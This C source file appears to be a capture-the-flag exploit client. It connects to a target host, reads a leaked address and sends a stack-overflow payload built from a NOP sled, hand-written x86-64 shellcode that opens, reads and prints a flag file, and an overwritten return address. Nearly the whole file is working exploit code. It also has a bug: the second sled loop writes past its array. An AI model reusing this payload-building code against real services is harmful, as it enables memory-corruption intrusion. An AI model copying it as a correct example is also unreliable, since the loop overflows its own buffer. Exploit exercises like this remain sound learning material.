#include <sys/socket.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

unsigned int endianSwap(unsigned char *bigEndian, unsigned char *lilEndian, size_t length);

int main(int argc, char **argv)
{
    int sockfd = -1;
    int status;
    ssize_t size;
    int exitcode = EXIT_FAILURE;
    struct addrinfo hints = {.ai_socktype = SOCK_STREAM};
    struct addrinfo *servinfo = NULL, *p;
    char buf[BUFSIZ];

    if (argc == 3)
    {
        status = getaddrinfo(argv[argc - 2], argv[argc - 1], &hints, &servinfo);
    }
    else
    {
        status = -1;
    }

    if (0 != status)
    {
        fprintf(stderr, "Error opening connection: %s\n", gai_strerror(status));
        goto done;
    }

    /* Connect to host; first option that works wins. */
    for (p = servinfo; p != NULL; p = p->ai_next)
    {
        sockfd = socket(p->ai_family, p->ai_socktype, 0);
        if (-1 == sockfd)
        {
            continue;
        }

        if (-1 == connect(sockfd, p->ai_addr, p->ai_addrlen))
        {
            close(sockfd);
            sockfd = -1;
            continue;
        }

        break;
    }

    if (-1 == sockfd)
    {
        fprintf(stderr, "failed to connect\n");
        goto done;
    }
    // 2066 total send
    // 1101 nop sled start
    unsigned char nopSledS[1101]; // S for start
    size_t i;
    for (i = 0; i < sizeof(nopSledS); i++)
    {
        nopSledS[i] = '\x90';
    }
    // 78 bytes of instruction
    const unsigned char first_instruct[10] = {
        "\x48\xc7\xc0\x02\x00\x00\x00" //
        "\x48\xc7\xc7" // +4 sent @ runtime during attack (flag address)
    };
    const unsigned char shellcodethatworked[64] = {
        // open
        // "\x48\xc7\xc0\x02\x00\x00\x00"
        // "\x48\xc7\xc7\xa0\x51\x40\x00" // need to capture the leaked string address and replace here
        "\x48\xc7\xc6\x00\x00\x00\x00" 
        "\x48\x31\xd2"
        "\x0f\x05" // 12
        // read
        "\x48\x89\xc7"
        "\x48\x8d\x74\x24\x20"
        "\x48\xc7\xc2\x30\x00\x00\x00" // 24
        "\x48\xc7\xc0\x00\x00\x00\x00"
        "\x0f\x05"
        // write
        "\x48\xc7\xc7\x01\x00\x00\x00"
        "\x48\x8d\x74\x24\x20" // 28
        "\x48\xc7\xc2\x30\x00\x00\x00"
        "\x48\xc7\xc0\x01\x00\x00\x00"
        "\x0f\x05"
    };
    // 877 nopsled *includes overwrite to rbp
    unsigned char nopSledE[877]; // E for end
    for (i = 0; i < sizeof(nopSledS); i++)
    {
        nopSledE[i] = '\x90';
    }
    //10 bytes for and retaddr \n 
    unsigned char retAddr[10] = {
        "\x90\xe7\xff\xff\xff\x7f\x00\x00\x00\n" // return address
    };
    // 1101+78+877+10 = 2066 bytes 

    // printf("Sizeof first and second: %ld\n", sizeof(first_instruct)+sizeof(shellcodethatworked));

    
    /**
     * Got my flag to print using address from
     */
    /* Read all bytes from host, and write them to stdout. */
    for (;;)
    {
        size = recv(sockfd, buf, BUFSIZ - 1, 0);
        if (0 == size)
        {
            break;
        }
        else if (size > 0)
        {
            write(STDOUT_FILENO, buf, size);
            /**
             * Plan:
             *  put shell code @ or near end of nopsled
             *  open(LEAK, RDONLY)
             *      Need to send in segments
             *      taking the leaked address and subbing in for %rdi
             *  read(fd, lea+8, 48)
             *  write(STDOUT(1), lea+8, 48)
             */

            unsigned char buf1[size];
            unsigned char buf2[8]; // want to send 4 bytes
            sscanf(buf, "%s %s", buf1, buf2);
            printf("[buf2]: %s %lu\n", buf2, strlen((char*)buf2));
            unsigned char swappedAddr[8]; // 8 bits = 1 byte, we want 4 bytes
            unsigned int flagAddress;
            flagAddress = endianSwap(buf2, swappedAddr, 8);
            // printf("flagaddr: %x %ld\n", flagAddress, sizeof(flagAddress));

            if (-1 == send(sockfd, nopSledS, sizeof(nopSledS), 0)) // send first sled 1101
            {
                perror("error sending (1)");
            }
            if (-1 == send(sockfd, first_instruct, sizeof(first_instruct), 0))
            {
                perror("error sending (2)");
            }
            if (-1 == send(sockfd, &flagAddress, sizeof(flagAddress), 0)) // already size 4 (int)
            {
                perror("error sending (3)");
            }
            if (-1 == send(sockfd, shellcodethatworked, sizeof(shellcodethatworked), 0))
            {
                perror("error sending (4)");
            }
            if (-1 == send(sockfd, nopSledE, sizeof(nopSledE), 0))
            {
                perror("error sending (4)");
            }
            if (-1 == send(sockfd, retAddr, sizeof(retAddr), 0))
            {
                perror("error sending (4)");
            }
            // printf("sizeof ret: %ld\n", sizeof(nopSledS)+sizeof(nopSledE)+sizeof(first_instruct)+sizeof(shellcodethatworked)+sizeof(retAddr)+sizeof(flagAddress));
        }
        else
        {
            perror("error reading from socket");
            goto done;
        }
    }

    exitcode = EXIT_SUCCESS;

done:
    if (-1 != sockfd)
    {
        close(sockfd);
    }

    if (NULL != servinfo)
    {
        freeaddrinfo(servinfo);
    }

    exit(exitcode);
}

unsigned int endianSwap(unsigned char *bigEndian, unsigned char *lilEndian, size_t length)
{
    printf("%ld, %ld, %ld\n", sizeof(bigEndian), sizeof(lilEndian), length);
    for (size_t i = 0; i < length; i += 2)
    {
        if (i + 1 < length)
        {
            // we have 2 chars
            lilEndian[(length - 1) - (i + 1)] = bigEndian[i]; // (6-1) - 1 = 4 ex: 4051a0
            lilEndian[(length - 1) - i] = bigEndian[i + 1];   // (6-1) - 0 = 5
        }
        else
        {
            // odd item left
            lilEndian[i - (length - 1)] = bigEndian[i]; // (7-1) - 6 = 0
        }
    }
    unsigned int test;
    sscanf((char*)lilEndian, "%x", &test);
    return test;
}


